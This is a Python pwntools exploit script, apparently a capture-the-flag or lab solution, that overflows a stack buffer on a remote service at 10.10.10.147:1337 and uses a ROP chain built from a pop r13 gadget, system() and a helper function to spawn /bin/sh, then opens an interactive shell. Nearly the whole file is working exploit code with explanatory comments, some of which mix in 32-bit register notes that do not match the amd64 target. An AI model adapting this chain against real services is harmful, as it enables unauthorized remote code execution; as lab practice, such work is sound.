# 0x40115f main
# 0x40116e - System
# 0x401206 - Pop r13, pop, pop
from pwn import *
#context(terminal=['tmux', 'new-window'])
#p = gdb.debug('./myapp', 'b main')
p = remote('10.10.10.147', 1337)
context(os='linux', arch='amd64')

junk = ("A"*112).encode()
# ROP chain
bin_sh = "/bin/sh\x00".encode()  # 8 character bytes
#plt_system = p64(0x401040)
system = p64(0x401040)
#pop_r13 = p64(0x401206) # Later used as JMP r13, treat as rsp
pop_r13 = p64(0x401204) # Later used as JMP r13, treat as rsp
null = p64(0x0)
test = p64(0x401152) # will call system, RSP > RDI, JMP r13

call_main = p64(0x40115f)
#p.recvuntil("What do you want me to echo back?")
# bin sh registered as the rsp variable, first memory address overwrite into rsp, 
# Test funtion is required in order for it to call all those previous instructions and have the program work correctly,
# if you look at the ghidra test function you will see the order of operations, it will pop pop the null values meanwhile return
# the system address while then pointing and executing the bin_sh program because of the jump instruction pointing to the sh program
# Test function address start 0x0000000000401152 : push rbp ; mov rbp, rsp ; mov rdi, rsp ; jmp r13
# Pop_r13 address start 0x0000000000401206 : pop r13 ; pop r14 ; pop r15 ; ret
#p.sendline(junk + bin_sh + pop_r13 + system + null + null + test)
## POP order of operations, 
## MOV EBP, [ESP] 
## ADD ESP, 4 
## This works we moved the address of system into r13 and placed /bin/sh to the top of the stack
#print(junk + bin_sh + pop_r13 + null + system + null + null + test)
p.sendline(junk + bin_sh + pop_r13 + null + system + null + null + test)
p.interactive()
